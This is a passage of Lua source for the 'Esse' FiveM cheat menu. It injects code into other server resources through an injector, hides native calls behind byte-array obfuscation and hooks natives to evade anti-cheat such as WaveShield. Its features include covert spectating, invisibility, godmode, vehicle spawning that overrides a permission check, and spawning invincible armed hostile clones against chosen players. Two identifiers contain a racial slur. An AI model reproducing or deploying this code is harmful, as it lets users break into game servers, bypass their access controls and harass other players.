            end
            local function _t()
                return _G[_d(_b("CreateThread"))]
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            local function Clamp(val, min, max)
                if val < min then return min end
                if val > max then return max end
                return val
            end
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                for _, pid in ipairs(players) do
                    if _g(_b("GetPlayerServerId"))(pid) == sid then
                        return pid
                    end
                end
                return -1
            end
            local function stopSpectate()
                if not _G.EsseSpectate or not _G.EsseSpectate.enabled then return end
                local me = _g(_b("PlayerPedId"))()
                local back = _G.EsseSpectate.back
                local heading = _G.EsseSpectate.heading
                local wasVisible = _G.EsseSpectate.wasVisible
                if _G.EsseSpectate.camera then
                    _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                    _g(_b("DestroyCam"))(_G.EsseSpectate.camera, false)
                    _G.EsseSpectate.camera = nil
                end
                if back then _g(_b("RequestCollisionAtCoord"))(back) end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                    local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                    _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                end
                if heading then _g(_b("SetEntityHeading"))(me, heading) end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _G.EsseSpectate.enabled = false
                _G.EsseSpectate.targetSid = nil
                _g(_b("SetFocusEntity"))(me)
            end
            -- Register stop event handler
            AddEventHandler("Esse:StopSpectateLoop", function()
                if _G.EsseSpectate then _G.EsseSpectate.enabled = false end
            end)
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                local myCoords = _g(_b("GetEntityCoords"))(me)
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.EsseSpectate then _G.EsseSpectate = {} end
                _G.EsseSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                _G.EsseSpectate.heading = myHeading
                _G.EsseSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.EsseSpectate.enabled = true
                _G.EsseSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    _G.EsseSpectate.enabled = false
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                _g(_b("RequestCollisionAtCoord"))(tCoords)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 3.0
                local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                _G.EsseSpectate.camera = cam
                _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                _t()(function()
                    _w(550)
                    while _G.EsseSpectate and _G.EsseSpectate.enabled do
                        local cid = findClientIdByServerId(_G.EsseSpectate.targetSid or targetSid)
                        if cid == -1 then break end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                        local camRot = _g(_b("GetCamRot"))(cam, 2)
                        local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                        local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                        local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                        local newYaw = camRot.z - x * 5
                        _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                        _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                        _w(0)
                    end
                    stopSpectate()
                end)
            end
            local sid = %d
            startSpectate(sid)
        ]], targetServerId))
        else
            print('Spectate Fallback #2')
            MachoInjectResourceRaw("monitor", string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                return _G[_d(_b("CreateThread"))]
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                for _, pid in ipairs(players) do
                    if _g(_b("GetPlayerServerId"))(pid) == sid then
                        return pid
                    end
                end
                return -1
            end
            -- Register stop event handler
            AddEventHandler("Esse:StopSpectateLoop", function()
                if _G.EsseSpectate then _G.EsseSpectate.enabled = false end
            end)
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                local myCoords = _g(_b("GetEntityCoords"))(me)
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.EsseSpectate then _G.EsseSpectate = {} end
                _G.EsseSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.EsseSpectate.heading = myHeading
                _G.EsseSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.EsseSpectate.enabled = true
                _G.EsseSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    _G.EsseSpectate.enabled = false
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                _g(_b("RequestCollisionAtCoord"))(tCoords)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                _t()(function()
                    while _G.EsseSpectate and _G.EsseSpectate.enabled do
                        local cid = findClientIdByServerId(_G.EsseSpectate.targetSid or targetSid)
                        if cid == -1 then break end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                end)
            end
            local sid = %d
            startSpectate(sid)
        ]], targetServerId))
        end
    end
    -- Only show start notification here (stop is handled above with early return)
    self:Notify("success", "Esse",
        ("Started spectating player %s - [%s]!"):format(
        GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
end

local enviFallbackResources = {
    "envi-medic",
    "envi-hud",
    "envi-yoga",
    "envi-chopshop",
    "envi-chopshop-v2",
    "envi-foodtrucks",
    "envi-dumpsters",
    "envi-prescriptions",
    "envi-druglabs",
    "lation_laundering"
}

local function enviGetStartedFallbackResource()
    for i, res in ipairs(enviFallbackResources) do
        if GetResourceState(res) == "started" then
            return res
        end
    end
    return nil
end

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function Esse:EnableInvisibility()
    self:Notify("sucses", "Esse", "Invisibility Enabled !", 3000)

    local function HookNative(nativeName, newFunction)
        local originalNative = _G[nativeName]
        if not originalNative or type(originalNative) ~= "function" then
            return
        end
        _G[nativeName] = function(...)
            return newFunction(originalNative, ...)
        end
    end

    HookNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
    HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
    HookNative("IsEntityVisible", function(originalFn, ...) return true end)
    HookNative("IsEntityVisibleToScript", function(originalFn, ...) return true end)
    HookNative("SetEntityVisible", function(originalFn, ped, toggle, unk)
        if _G.EsseInvisibility and _G.EsseInvisibility.enabled then
            return originalFn(ped, false, unk)
        end
        return originalFn(ped, toggle, unk)
    end)

    if not _G.EsseInvisibility then
        _G.EsseInvisibility = {
            enabled = false,
            wasVisible = true,
        }
    end
    if not _G.EsseInvisibility.enabled then
        _G.EsseInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.EsseInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        CreateThread(function()
            while _G.EsseInvisibility and _G.EsseInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    end
end

function Esse:DisableInvisibility()
    if _G.EsseInvisibility and _G.EsseInvisibility.enabled then
        _G.EsseInvisibility.enabled = false
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityVisible(ped, _G.EsseInvisibility.wasVisible, false)

            self:Notify("error", "Esse", "Invisibility Disabled !", 3000)
        end
    end
end

function Esse:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)

    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)

    MachoInjectResourceRaw("monitor", string.format([[
    local function decode(tbl)
        local s = ""
        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
        return s
    end
    local function g(n)
        return _G[decode(n)]
    end
    local function wait(n)
        return Citizen.Wait(n)
    end
    local function findClientIdByServerId(sid)
        local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
        for _, pid in ipairs(players) do
            if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                return pid
            end
        end
        return nil
    end
    local function copyPedAppearance(sourcePed, targetPed)
        for i = 0, 11 do
            local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
            local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
            g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
        end
        for i = 0, 7 do
            local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
            local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
            if propIndex ~= -1 then
                g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
            else
                g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
            end
        end
        local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
        if headBlendData[1] then
            g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                targetPed,
                headBlendData[2], -- shapeFirst
                headBlendData[3], -- shapeSecond
                headBlendData[4], -- shapeThird
                headBlendData[5], -- skinFirst
                headBlendData[6], -- skinSecond
                headBlendData[7], -- skinThird
                headBlendData[8], -- shapeMix
                headBlendData[9], -- skinMix
                headBlendData[10] -- thirdMix
            )
        end
    end
    local function clonePed(ped)
        local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
        local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
        local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
        g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
        local timeout = 0
        while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
            wait(10)
            timeout = timeout + 1
        end
        if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
        -- Spawn ped 2 units away from player
        local spawnRadius = 2.0
        local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
        local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
        local spawnZ = coords.z
        local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
        if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
            copyPedAppearance(ped, clone)
            g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
            g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
            local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
            g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
            g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
            g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)

            local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
            g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
            local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
            if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
            end
            g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
            g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
            g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
            g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
            g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
            g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
            g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
        end
    end
    local playerIds = {%s}
    for _, targetServerId in ipairs(playerIds) do
        local clientId = findClientIdByServerId(targetServerId)
        local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
        if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
            clonePed(ped)
        end
    end
]], playerIdsStr))
end

function Esse:HandleGodmodeToggle(enabled)
    local waveShieldStarted = GetResourceState("WaveShield") == "started"
    local targetResource = GetResourceState("monitor") == "started" and "monitor" or
    (waveShieldStarted and "WaveShield" or "any")

    if waveShieldStarted then
        if enabled then
            Esse:Notify("success", "Esse", "Godmode Enabled (WaveShield)", 3000)
            Injection(targetResource, [[
            if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
            _G.EsseGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.EsseGodmode.originals[nativeName] then
                    _G.EsseGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                if _G.EsseGodmode and _G.EsseGodmode.enabled then
                    return originalFn(entity, true)
                end
                return originalFn(entity, toggle)
            end)

            local co = coroutine.create(function()
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
            end)
            while coroutine.status(co) ~= "dead" do
                coroutine.resume(co)
                Citizen.Wait(0)
            end
        ]])
        else
            Esse:Notify("error", "Esse", "Godmode Disabled (WaveShield)", 3000)
            Injection(targetResource, [[
            if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
            _G.EsseGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.EsseGodmode.originals[nativeName] then
                    _G.EsseGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                if _G.EsseGodmode and _G.EsseGodmode.enabled then
                    return originalFn(entity, true)
                end
                return originalFn(entity, toggle)
            end)

            local co = coroutine.create(function()
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
            end)
            while coroutine.status(co) ~= "dead" do
                coroutine.resume(co)
                Citizen.Wait(0)
            end
        ]])
        end
        return
    end

    -- Non-WaveShield branch
    if enabled then
        Esse:Notify("success", "Esse", "Godmode Enabled", 3000)
        MachoInjectResource2("AsThreadNs", "any", [[
        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
        _G.EsseGodmode.enabled = true

        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            if not _G.EsseGodmode.originals[nativeName] then
                _G.EsseGodmode.originals[nativeName] = originalNative
            end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("SetPlayerInvincible", function(originalFn, player, toggle)
            if _G.EsseGodmode and _G.EsseGodmode.enabled then
                return originalFn(player, true)
            end
            return originalFn(player, toggle)
        end)

        hNative("GetPlayerInvincible", function(originalFn, ...)
            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
            return originalFn(...)
        end)

        hNative("GetPlayerInvincible_2", function(originalFn, ...)
            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
            return originalFn(...)
        end)

        pcall(function() SetPlayerInvincible(PlayerId(), true) end)
    ]])
    else
        Esse:Notify("error", "Esse", "Godmode Disabled", 3000)
        MachoInjectResource2("AsThreadNs", "any", [[
        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
        _G.EsseGodmode.enabled = false

        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            if not _G.EsseGodmode.originals[nativeName] then
                _G.EsseGodmode.originals[nativeName] = originalNative
            end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("SetPlayerInvincible", function(originalFn, player, toggle)
            return originalFn(player, false)
        end)

        hNative("GetPlayerInvincible", function(originalFn, ...)
            return false
        end)

        hNative("GetPlayerInvincible_2", function(originalFn, ...)
            return false
        end)

        for name, original in pairs(_G.EsseGodmode.originals or {}) do
            if original and type(original) == "function" then
                _G[name] = original
            end
        end
        _G.EsseGodmode.originals = {}

        pcall(function() SetPlayerInvincible(PlayerId(), false) end)
    ]])
    end
end

function Esse:SpawnSelectedVehicle(model, teleportInto, deletePrevious)
    if not model or model == "" then return end

    local ped = PlayerPedId()
    local currentVeh = GetVehiclePedIsIn(ped, false)
    local serverEndpoint = GetCurrentServerEndpoint()

    -- capture original coords/heading once so injected code can use literal numbers (avoid nil ogCoords inside injection)
    local ogCoords = GetEntityCoords(ped)
    local ogHeading = GetEntityHeading(ped)

    if GetResourceState("solos-rentals") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 1)", 3000)

        Injection("solos-rentals", string.format([[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


        hNative("RequestModel", function(originalFn, model)
            return originalFn(model)
        end)

        hNative("HasModelLoaded", function(originalFn, model)
            return originalFn(model)
        end)

        hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
            return originalFn(model, x, y, z, heading, networked, p6)
        end)

        local model = "%s"
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local playerHeading = GetEntityHeading(playerPed)
        config.locations["customnigga"] = {
            vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
        }

        if %s then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

        Citizen.CreateThread(function()
            Citizen.Wait(300) -- give spawn a short moment
            if %s then
                -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                local coords = config.locations["customnigga"].vehiclespawncoords
                local x,y,z = coords.x, coords.y, coords.z
                local hash = GetHashKey(model)
                local vehicle = nil
                -- try to find a nearby vehicle with that model hash
                for ent in EnumerateVehicles() do
                    if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                        vehicle = ent
                        break
                    end
                end
                if vehicle and DoesEntityExist(vehicle) then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                end
            else
                SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                SetEntityHeading(PlayerPedId(), %f)
            end
        end)
    ]], model, tostring(deletePrevious), tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
    elseif GetResourceState("amigo") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 2)", 3000)

        Injection("adminMenu", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                local originalHasPerm = hasPerm
                hasPerm = function(perm) return true end

                local originalIsModelInCdimage = IsModelInCdimage
                IsModelInCdimage = function(model) return true end

                local veh = spawnVeh(model)

                hasPerm = originalHasPerm
                IsModelInCdimage = originalIsModelInCdimage

                Citizen.Wait(200)
                if %s then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                    end
                end
            ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif targetResource then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 3)", 3000)


        Injection(targetResource, string.format([[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

        local model = "%s"
        local coords = GetEntityCoords(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())

        if %s then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
            Citizen.Wait(200)
            if %s then
                if vehicle and DoesEntityExist(vehicle) then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end
        end)
    ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("qb-core") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 4)", 3000)

        Injection("qb-core", [[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

        local model = "]] .. model .. [["

        if ]] .. tostring(deletePrevious) .. [[ then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        QBCore.Functions.SpawnVehicle(model, function(veh)
            Citizen.Wait(200)
            if ]] .. tostring(teleportInto) .. [[ then
                if veh and DoesEntityExist(veh) then
                    TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                end
            else
                SetEntityCoords(PlayerPedId(), ]] ..
